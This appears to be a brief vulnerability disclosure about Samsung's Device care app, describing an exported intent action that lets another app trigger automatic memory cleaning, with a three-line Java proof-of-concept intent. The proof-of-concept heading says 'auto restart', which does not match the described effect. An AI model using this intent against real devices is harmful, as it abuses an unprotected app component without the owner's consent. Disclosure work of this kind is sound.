# Description

The Device care app handles action `com.samsung.android.sm.ACTION_RAM`. If the attacker passes the `memory optimize` parameter set to `true`, the app will start automatic memory cleaning.

**Proof of Concept**

Enabling auto restart:
```java
Intent i = new Intent("com.samsung.android.sm.ACTION_RAM");
i.putExtra("memory optimize", true);
startActivity(i);
```
